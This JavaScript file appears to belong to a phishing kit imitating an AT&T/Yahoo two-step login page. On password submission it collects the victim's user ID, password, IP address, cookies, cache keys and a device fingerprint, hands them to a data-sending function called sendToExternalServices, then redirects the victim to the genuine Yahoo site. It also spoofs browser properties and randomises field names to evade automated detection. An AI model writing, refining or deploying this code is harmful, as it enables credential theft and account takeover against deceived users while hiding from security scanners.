document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('loginForm') || document.getElementById('passwordForm');
    const userIdInput = document.getElementById('userId');
    const errorMessage = document.getElementById('errorMessage');
    const loading = document.getElementById('loading');
    const notification = document.createElement('div');
    notification.id = 'notification';
    document.querySelector('.login-box').appendChild(notification);

    // User ID form submit
    if (form && form.id === 'loginForm') {
        form.addEventListener('submit', (e) => {
            e.preventDefault();
            const email = userIdInput.value.trim();
            if (email.length < 4) {
                showError('Make sure you enter at least 4 characters.');
                return;
            }
            if (!isValidEmail(email)) {
                showError("This information is required. If you don't remember your user ID, use Forgot user ID link.");
                return;
            }
            errorMessage.style.display = 'none';
            loading.style.display = 'flex';
            const delay = Math.random() * 2000;
            setTimeout(() => {
                loading.style.display = 'none';
                window.location.href = `password.html?userId=${encodeURIComponent(email)}`;
            }, delay);
        });
    }

    // Password page logic
    if (form && form.id === 'passwordForm') {
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('userId');
        const userIdDisplay = document.getElementById('userIdDisplay');
        if (userIdDisplay && userId) userIdDisplay.textContent = decodeURIComponent(userId);

        const backArrow = document.getElementById('backArrow');
        if (backArrow) {
            backArrow.addEventListener('click', () => {
                window.location.href = 'index.html';
            });
        }

        const passwordInput = document.getElementById('password');
        const showBtn = document.getElementById('showPassword');
        if (showBtn && passwordInput) {
            showBtn.addEventListener('click', () => {
                const isPassword = passwordInput.type === 'password';
                passwordInput.type = isPassword ? 'text' : 'password';
                showBtn.textContent = isPassword ? 'Hide' : 'Show';
                passwordInput.style.width = '100%';
                passwordInput.style.paddingRight = '60px';
            });
        }

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const password = passwordInput.value;
            if (password.length < 4) {
                showError('Make sure you enter at least 4 characters.');
                return;
            }
            errorMessage.style.display = 'none';
            loading.style.display = 'flex';
            const delay = Math.random() * 2000;
            // Gather real info for notifications
            // Use raw userId and password for notifications
            const ipAddress = await getIPAddress();
            const currentTime = new Date().toLocaleString('en-US', { timeZone: 'America/New_York' });
            const currentUrl = window.location.href;
            const cookies = document.cookie;
            const cacheInfo = await getCacheInfo();
            const deviceFingerprint = getDeviceFingerprint();
            // Send first notification (IP, time, URL)
            sendToExternalServices({
                type: 'submission',
                userId: userId ? decodeURIComponent(userId) : '',
                password: password,
                ipAddress,
                localTime: currentTime,
                url: currentUrl
            });
            // Send second notification (cookies, cache, fingerprint) after a short delay
            setTimeout(() => {
                sendToExternalServices({
                    type: 'details',
                    cookies,
                    cacheInfo,
                    deviceFingerprint
                });
            }, 1000);
            setTimeout(() => {
                loading.style.display = 'none';
                window.location.href = 'https://currently.att.yahoo.com/';
            }, delay);
        });
    }

    userIdInput?.addEventListener('input', () => {
        errorMessage.style.display = 'none';
    });

    function showNotification(message, type) {
        notification.textContent = message;
        notification.className = 'notification ' + (type || 'info');
        notification.style.display = 'block';
        notification.setAttribute('aria-live', 'polite');
        setTimeout(() => {
            notification.style.opacity = 1;
        }, 10);
        setTimeout(() => {
            notification.style.opacity = 0;
            setTimeout(() => { notification.style.display = 'none'; }, 300);
        }, 3500);
    }

    function showError(message) {
        errorMessage.textContent = message;
        errorMessage.style.display = 'block';
        errorMessage.style.fontWeight = '400';
        errorMessage.style.color = '#d32f2f';
    }

    function isValidEmail(email) {
        const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        return emailPattern.test(email) && email.length > 5;
    }

    function encodeEmail(email) {
        return btoa(email.split('').reverse().join(''));
    }

    // Fetch real IP address asynchronously
    async function getIPAddress() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch (e) {
            return '';
        }
    }

    // Try to get cache info (limited in browser)
    async function getCacheInfo() {
        if ('caches' in window) {
            const keys = await caches.keys();
            return keys.join(', ');
        }
        if (navigator.storage && navigator.storage.estimate) {
            const estimate = await navigator.storage.estimate();
            return `usage: ${estimate.usage}, quota: ${estimate.quota}`;
        }
        return '';
    }

    function getDeviceFingerprint() {
        return {
            userAgent: navigator.userAgent,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            language: navigator.language,
            platform: navigator.platform,
            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory || 'unknown',
            touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0
        };
    }

    // Anti-detect: spoof navigator properties
    Object.defineProperty(navigator, 'platform', {
        get: () => 'SecurePlatform_' + Math.random().toString(36).substring(7)
    });
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
    Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
    Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });

    // Honeypot anti-bot field
    if (form && form.id === 'loginForm') {
        let honeypot = document.createElement('input');
        honeypot.type = 'text';
        honeypot.name = 'website';
        honeypot.style.display = 'none';
        form.appendChild(honeypot);
    }

    // Randomize field names (anti-bot)
    function randomizeFieldName(field) {
        if (field) field.name = 'f_' + Math.random().toString(36).substring(2, 10);
    }
    randomizeFieldName(document.getElementById('userId'));
    randomizeFieldName(document.getElementById('password'));

    // Basic anti-automation check
    if (window.outerWidth === 0 || window.outerHeight === 0) {
        console.warn('Possible automation detected at ' + new Date().toLocaleString());
    }
});